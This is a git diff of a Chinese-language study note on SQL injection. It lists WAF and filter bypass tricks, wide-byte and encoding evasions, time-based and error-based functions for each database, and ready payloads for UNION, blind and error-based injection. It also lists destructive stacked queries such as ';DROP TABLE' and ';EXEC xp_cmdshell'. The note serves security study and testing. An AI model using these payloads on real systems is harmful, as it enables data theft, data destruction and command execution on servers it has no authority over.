@@ -30,123 +30,62 @@ DDL/DCL, 只能通过最小权限原则、黑白名单来处理
 >ORM（Object Relational Mapping）通过对象模型映射关系数据库，自动生成 SQL 并负责参数绑定。你不再手写 SQL，而是用代码操作"对象"，ORM 帮你安全地拼 SQL。
 
 ---
-### 一些绕过方式：
+### SQL注入绕过技巧
 
-空格绕过
-- `/**/` - 注释符
-- `%09` - Tab
-- `%0a` - 换行
-- `%0d` - 回车
-- `()` - 括号
-- `+` - 加号
+#### 基础绕过
+**空格绕过**：`/**/`、`%09`(Tab)、`%0a`(换行)、`%0d`(回车)、`()`、`+`
 
-引号绕过
-- `0x616461696e` - 十六进制
-- `CHAR(97,100,109,105,110)` - CHAR函数
-- `CONCAT()` - 字符串拼接
-- `%df'` - 宽字节注入
+**引号绕过**：`0x616461696e`(十六进制)、`CHAR(97,100,109,105,110)`、`CONCAT()`、`%df'`(宽字节)
 
-关键字绕过
-- `SeLeCt` - 大小写混淆
-- `selselectect` - 双写
-- `SEL/**/ECT` - 内联注释
-- `/*!50000SELECT*/` - 版本注释
-- `%53%45%4c%45%43%54` - URL编码
+**关键字绕过**：`SeLeCt`(大小写)、`selselectect`(双写)、`SEL/**/ECT`(内联注释)、`/*!50000SELECT*/`(版本注释)、`%53%45%4c%45%43%54`(URL编码)
 
-逻辑运算符
-- `&&` - 替代AND
-- `||` - 替代OR
-- `LIKE` - 替代=
-- `IN()` - 替代=
-- `BETWEEN` - 替代=
-- `REGEXP` - 正则匹配
+**编码绕过**：`%27`(URL编码)、`%2527`(双重编码)、`%u0027`(Unicode)、`&#39;`(HTML实体)、Base64
 
-函数替换
-- `SUBSTR / MID / LEFT / RIGHT` - 字符串截取
-- `IF / CASE WHEN` - 条件判断
-- `BENCHMARK` - 替代SLEEP
-- `GET_LOCK` - 延时函数
+**宽字节注入**：`%df'`(GBK)、`%a1'`(Big5)、`%81'`(Shift-JIS)
 
-等价函数
-- `@@version` - 替代version()
-- `schema()` - 替代database()
-- `current_user()` - 替代user()
-- `||` / `+` - 字符串连接
+#### 语法替换
+**逻辑运算符**：`&&`(替代AND)、`||`(替代OR)、`LIKE/IN()/BETWEEN/REGEXP`(替代=)
 
-参数污染
-- `id=1&id=2` - 多个同名参数
-- 测试取第一个/最后一个/拼接
+**函数替换**：`SUBSTR/MID/LEFT/RIGHT`(字符串截取)、`IF/CASE WHEN`(条件判断)、`BENCHMARK/GET_LOCK`(替代SLEEP)
 
-编码绕过
-- `%27` - URL编码
-- `%2527` - 双重URL编码
-- `%u0027` - Unicode
-- `&#39;` - HTML实体
-- `Base64`
+**等价函数**：`@@version`(替代version())、`schema()`(替代database())、`current_user()`(替代user())、`||/+`(字符串连接)
 
-宽字节注入
-- `%df'` - GBK编码
-- `%a1'` - Big5编码
-- `%81'` - Shift-JIS
+#### 特殊场景
+**参数污染**：`id=1&id=2` - 测试取第一个/最后一个/拼接
 
-堆叠查询
-- `;DROP TABLE` - 多语句执行
-- `;UPDATE` - 修改数据
-- `;EXEC xp_cmdshell` - 命令执行
+**堆叠查询**：`;DROP TABLE`、`;UPDATE`、`;EXEC xp_cmdshell`
 
-二次注入
-- 第一步：插入恶意数据（被转义）
-- 第二步：查询时触发（未转义）
+**二次注入**：插入时被转义 → 查询时触发（未转义）
 
-时间盲注
-- `SLEEP(5)` - MySQL
-- `BENCHMARK()` - MySQL替代
-- `WAITFOR DELAY` - SQL Server
-- `pg_sleep()` - PostgreSQL
-- `DBMS_LOCK.SLEEP` - Oracle
+#### 时间盲注函数（按数据库）
+- **MySQL**：`SLEEP(5)`、`BENCHMARK()`
+- **SQL Server**：`WAITFOR DELAY '0:0:5'`
+- **PostgreSQL**：`pg_sleep(5)`
+- **Oracle**：`DBMS_LOCK.SLEEP(5)`
 
+#### 报错注入函数（按数据库）
+- **MySQL**：`updatexml()`、`extractvalue()`、`floor(rand()*2)`、`exp()`、`GeometryCollection()`
+- **SQL Server**：`CONVERT(int, @@version)`
+- **Oracle**：`utl_inaddr.get_host_address()`、`XMLType()`
+- **PostgreSQL**：`CAST(version() AS int)`
 
+#### 常用Payload
+```sql
+-- 判断列数
+' ORDER BY 1-- / ' ORDER BY 2--
 
-报错注入
- MySQL
-- `updatexml()`
-- `extractvalue()`
-- `floor(rand()*2)`
-- `exp()`
-- `GeometryCollection()`
-
- SQL Server
-- `CONVERT(int, @@version)`
-
- Oracle
-- `utl_inaddr.get_host_address()`
-- `XMLType()`
-
- PostgreSQL
-- `CAST(version() AS int)`
-
-常用Payload
-判断列数
-```
-' ORDER BY 1--
-' ORDER BY 2--
-```
- 联合注入
-```
+-- 联合注入
 ' UNION SELECT 1,2,3--
 ' UNION SELECT null,database(),user()--
-```
- 布尔盲注
-```
+
+-- 布尔盲注
 ' AND 1=1--
 ' AND SUBSTRING(database(),1,1)='a'--
-```
- 时间盲注
-```
+
+-- 时间盲注
 ' AND IF(1=1,SLEEP(5),0)--
-```
- 报错注入
-```
+
+-- 报错注入
 ' AND updatexml(1,concat(0x7e,database()),1)--
 ```
 
